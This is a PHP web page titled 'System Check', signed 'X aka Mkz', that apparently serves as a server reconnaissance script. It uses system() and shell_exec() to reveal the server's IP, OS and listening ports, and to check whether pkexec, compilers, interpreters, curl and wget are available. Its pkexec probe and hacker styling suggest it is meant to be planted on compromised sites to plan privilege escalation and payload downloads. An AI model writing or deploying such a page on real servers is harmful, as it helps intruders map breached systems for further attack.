<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Check</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #1e1e1e;
            color: #00FF00;
            padding: 20px;
            margin: 0;
            position: relative;
            min-height: 100vh;
            font-size: 14px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #2e2e2e;
            border-radius: 8px;
        }
        .info {
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            gap: 20px;
            padding: 10px 0;
            margin-bottom: 20px;
        }
        .info div {
            padding: 15px;
            background-color: #3e3e3e;
            border: 2px solid #00FF00;
            border-radius: 8px;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background-color: #3e3e3e;
            border-left: 5px solid #00FF00;
            border-radius: 8px;
        }
        .active {
            border-left-color: #00FF00;
        }
        .not-active {
            border-left-color: #FF0000;
        }
        footer {
            position: absolute;
            bottom: 0;
            width: 100%;
            text-align: center;
            padding: 10px 0;
            background-color: #2e2e2e;
            color: #00FF00;
            font-size: 0.9em;
            border-top: 2px solid #00FF00;
        }
        h1 {
            color: #00FF00;
            font-size: 24px;
            margin-bottom: 20px;
        }
        .command-output {
            font-family: monospace;
            background-color: #111;
            padding: 10px;
            border-radius: 4px;
            overflow-x: auto;
        }
    </style>
</head>
<body>

    <div class="container">
        <?php
        function getServerIP() {
            return $_SERVER['SERVER_ADDR'];
        }

        function getOpenPorts() {
            $output = shell_exec('netstat -tuln | grep LISTEN');
            return nl2br(htmlspecialchars($output));
        }

        function getOS() {
            return php_uname();
        }
        ?>

        <div class="info">
            <div>
                <strong>Server IP:</strong><br>
                <?php echo getServerIP(); ?>
            </div>
            <div>
                <strong>Open Ports:</strong><br>
                <div class="command-output"><?php echo getOpenPorts(); ?></div>
            </div>
            <div>
                <strong>Operating System:</strong><br>
                <?php echo getOS(); ?>
            </div>
        </div>

        <h1>System Status Check</h1>

        <?php
        function checkCommand($command) {
            if (function_exists('system')) {
                ob_start();
                system($command . " 2>&1", $status);
                $output = ob_get_clean();

                if ($status === 0) {
                    echo "<div class='result active'><strong>" . htmlspecialchars($command) . "</strong> is available and active.<br>Output: <div class='command-output'>" . nl2br(htmlspecialchars($output)) . "</div></div>";
                } else {
                    echo "<div class='result not-active'><strong>" . htmlspecialchars($command) . "</strong> is not available or there was an error.<br>Output: <div class='command-output'>" . nl2br(htmlspecialchars($output)) . "</div></div>";
                }
            } else {
                echo "<div class='result not-active'>The system function is disabled.</div>";
            }
        }

        function checkSystemFunction() {
            if (function_exists('system')) {
                echo "<div class='result active'>The system function is enabled and active.</div>";
            } else {
                echo "<div class='result not-active'>The system function is disabled.</div>";
            }
        }

        checkSystemFunction();
        checkCommand("pkexec --version");
        checkCommand("python --version");
        checkCommand("gcc --version");
        checkCommand("perl -v");
        checkCommand("node --version");
        checkCommand("npm --version");
        checkCommand("ruby --version");
        checkCommand("java -version");
        checkCommand("php -v");
        checkCommand("apache2 -v");
        checkCommand("nginx -v");
        checkCommand("mysql --version");
        checkCommand("psql --version");
        checkCommand("docker --version");
        checkCommand("git --version");
        checkCommand("composer --version");
        checkCommand("curl --version");
        checkCommand("wget --version");
        ?>

        <footer>
            X aka Mkz
        </footer>
    </div>
</body>
</html>
